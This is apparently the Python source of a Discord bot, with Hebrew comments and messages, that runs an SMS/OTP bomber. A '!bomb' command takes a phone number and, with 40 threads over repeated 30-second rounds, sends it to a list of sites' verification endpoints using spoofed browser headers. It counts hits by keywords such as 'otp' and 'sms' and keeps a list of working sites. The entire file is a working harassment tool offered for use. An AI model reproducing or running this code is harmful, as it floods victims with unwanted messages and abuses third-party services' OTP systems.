#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# bot.py - בוט דיסקורד שמפעיל את הבומבר

import asyncio, json, os, re, threading, time
import urllib.request, urllib.error
from concurrent.futures import ThreadPoolExecutor, wait, FIRST_COMPLETED

import discord
from discord.ext import commands
import requests

HERE = os.path.dirname(os.path.abspath(__file__))
SITES_FILE = os.path.join(HERE, "sites.txt")
ALIVE_FILE = os.path.join(HERE, "alive.json")
TOKEN_FILE = os.path.join(HERE, "token.txt")

# ================= הגדרות =================
COUNTRY_CODE = "972"
ROUND_SECONDS = 30
WORKERS = 40
TIMEOUT = 8
USE_ALIVE_ONLY = True
MAX_ROUNDS = 30

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
    "Origin": "https://www.google.com",
    "Referer": "https://www.google.com/",
    "Content-Type": "application/json",
}

PAYLOAD = ("phone", "mobile", "number")


# ================= עזרים =================
def load_sites():
    try:
        with open(SITES_FILE, encoding="utf-8") as f:
            return [l.strip() for l in f if l.strip() and not l.startswith("#")]
    except FileNotFoundError:
        return []


def load_alive():
    try:
        with open(ALIVE_FILE, encoding="utf-8") as f:
            return set(json.load(f))
    except Exception:
        return set()


def save_alive(alive):
    try:
        with open(ALIVE_FILE, "w", encoding="utf-8") as f:
            json.dump(sorted(alive), f, ensure_ascii=False, indent=1)
    except Exception:
        pass


def norm_phone(raw):
    p = re.sub(r"[^\d+]", "", raw or "")
    if not p:
        return ""
    if p.startswith("+"):
        p = p[1:]
    elif p.startswith("00"):
        p = p[2:]
    if p.startswith("0"):
        p = COUNTRY_CODE + p[1:]
    elif not p.startswith(COUNTRY_CODE):
        p = COUNTRY_CODE + p
    return p


def build_url(site, phone):
    if "{phone}" in site:
        return site.replace("{phone}", phone)
    if "?" in site:
        return site + "&phone=" + phone
    return site + "?phone=" + phone


def fire(session, site, phone):
    url = build_url(site, phone)
    data = {k: phone for k in PAYLOAD}
    r = None
    try:
        r = session.post(url, json=data, timeout=TIMEOUT, allow_redirects=True)
    except Exception:
        pass
    if r is None or r.status_code in (404, 405):
        try:
            r = session.get(url, timeout=TIMEOUT, allow_redirects=True)
        except Exception:
            return False
    if r.status_code in (204, 429):
        return True
    if r.status_code in (200, 201, 202):
        ct = (r.headers.get("content-type") or "").lower()
        if "json" in ct:
            return True
        body = r.text[:500].lower()
        if any(k in body for k in ("otp", "sms", "code", "success", "sent", "verif")):
            return True
    return False


def bar(pct, width=14):
    fill = max(0, min(width, int(width * pct)))
    return "#" * fill + "." * (width - fill)


# ================= המנוע =================
class Job:
    def __init__(self, phone, rounds):
        self.phone = phone
        self.rounds = rounds
        self.round = 1
        self.sent = 0
        self.ok = 0
        self.running = False
        self.stop = False
        self.alive = set()
        self.started = time.time()


def run_job(job, sites):
    ex = ThreadPoolExecutor(max_workers=WORKERS)
    session = requests.Session()
    session.headers.update(HEADERS)
    try:
        for rnd in range(1, job.rounds + 1):
            if job.stop:
                break
            job.round = rnd
            end = time.time() + ROUND_SECONDS
            queue = list(sites)
            pending = {}
            while time.time() < end and not job.stop:
                if not queue and len(pending) < WORKERS:
                    queue = list(sites)
                while queue and len(pending) < WORKERS:
                    s = queue.pop(0)
                    pending[ex.submit(fire, session, s, job.phone)] = s
                if not pending:
                    break
                done, _ = wait(list(pending), timeout=0.5, return_when=FIRST_COMPLETED)
                for f in done:
                    site = pending.pop(f, None)
                    job.sent += 1
                    try:
                        if f.result():
                            job.ok += 1
                            if site:
                                job.alive.add(site)
                    except Exception:
                        pass
    except Exception as e:
        print("engine error:", e)
    finally:
        try:
            session.close()
        except Exception:
            pass
        ex.shutdown(wait=False)
        job.running = False


# ================= הבוט =================
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
CURRENT = {"job": None}


def progress_text(job):
    el = time.time() - job.started
    tot = job.rounds * ROUND_SECONDS
    pct = min(1.0, el / tot) if tot else 0
    return (f"**רץ** — `{job.phone}`\n"
            f"סבב **{job.round}/{job.rounds}** | `{bar(pct)}` {int(pct * 100)}%\n"
            f"נשלחו: **{job.sent}** | הצליחו: **{job.ok}** | אתרים חיים: **{len(job.alive)}**\n"
            f"זמן: {int(el)}s / {tot}s")


@bot.event
async def on_ready():
    print(f"מחובר בתור {bot.user} | {len(bot.guilds)} שרתים")


@bot.command(name="bomb")
async def bomb(ctx, phone: str = None, rounds: int = 3):
    cur = CURRENT["job"]
    if cur and cur.running:
        return await ctx.send("כבר יש הפצצה פעילה. `!stop` לעצור.")
    if not phone:
        return await ctx.send("שימוש: `!bomb 0501234567 3`")
    p = norm_phone(phone)
    if len(p) < 8:
        return await ctx.send(f"מספר לא תקין: `{phone}`")
    rounds = max(1, min(int(rounds), MAX_ROUNDS))
    sites = load_sites()
    if not sites:
        return await ctx.send("`sites.txt` חסר. הרץ `python sync_sites.py`.")
    if USE_ALIVE_ONLY:
        alive = load_alive()
        f = [s for s in sites if s in alive]
        if f:
            sites = f
    job = Job(p, rounds)
    job.running = True
    CURRENT["job"] = job
    threading.Thread(target=run_job, args=(job, sites), daemon=True).start()
    msg = await ctx.send(f"**מתחיל** — `{p}`\n{rounds} סבבים × {ROUND_SECONDS}s | {len(sites)} כתובות")
    while job.running:
        await asyncio.sleep(3)
        try:
            await msg.edit(content=progress_text(job))
        except Exception:
            pass
    if job.alive:
        save_alive(load_alive() | job.alive)
    tail = " (הופסק)" if job.stop else ""
    try:
        await msg.edit(content=f"**הסתיים**{tail} — `{job.phone}`\n"
                               f"נשלחו: **{job.sent}** | הצליחו: **{job.ok}** | חיים: **{len(job.alive)}**")
    except Exception:
        pass


@bot.command(name="stop")
async def stop(ctx):
    j = CURRENT["job"]
    if j and j.running:
        j.stop = True
        await ctx.send("עוצר...")
    else:
        await ctx.send("אין הפצצה פעילה.")


@bot.command(name="status")
async def status(ctx):
    j = CURRENT["job"]
    await ctx.send(progress_text(j) if j and j.running else "אין הפצצה פעילה.")


@bot.command(name="sites")
async def sites_cmd(ctx):
    await ctx.send(f"בקובץ: **{len(load_sites())}** | מאומתות: **{len(load_alive())}**")


@bot.command(name="reset")
async def reset(ctx):
    save_alive(set())
    await ctx.send("נמחק.")


@bot.command(name="help")
async def help_cmd(ctx):
    await ctx.send("**פקודות**\n`!bomb 0501234567 3`\n`!stop`\n`!status`\n`!sites`\n`!reset`")


def read_token():
    tok = os.environ.get("DISCORD_TOKEN", "").strip()
    if not tok:
        try:
            raw = open(TOKEN_FILE, encoding="utf-8-sig").read()
        except FileNotFoundError:
            raw = ""
        for line in raw.replace("\r", "\n").split("\n"):
            line = line.strip().strip('"').strip("'").strip()
            if line and not line.startswith("#"):
                tok = line
                break
    for junk in ("\u200b", "\ufeff", "\xa0", " "):
        tok = tok.replace(junk, "")
    return tok


def preflight(token):
    r = urllib.request.Request("https://discord.com/api/v10/users/@me")
    r.add_header("Authorization", "Bot " + token)
    r.add_header("User-Agent", "DiscordBot (venice.ai, 1.0)")
    try:
        with urllib.request.urlopen(r, timeout=20) as f:
            return json.loads(f.read().decode("utf-8", "replace")), None
    except urllib.error.HTTPError as e:
        return None, "HTTP %d - %s" % (e.code, e.read().decode("utf-8", "replace")[:150])
    except Exception as e:
        return None, str(e)


if __name__ == "__main__":
    token = read_token()
    if not token:
        print("no token in token.txt")
        raise SystemExit(1)
    print("checking token...")
    me, err = preflight(token)
    if me is None:
        print("TOKEN REJECTED:", err)
        print("Reset Token in the developer portal, then put the new one in token.txt")
        raise SystemExit(1)
    print("ok, connecting as %s" % me.get("username", "?"))
    try:
        bot.run(token)
    except KeyboardInterrupt:
        print("\nstopped.")
    except Exception as e:
        print("error:", e)
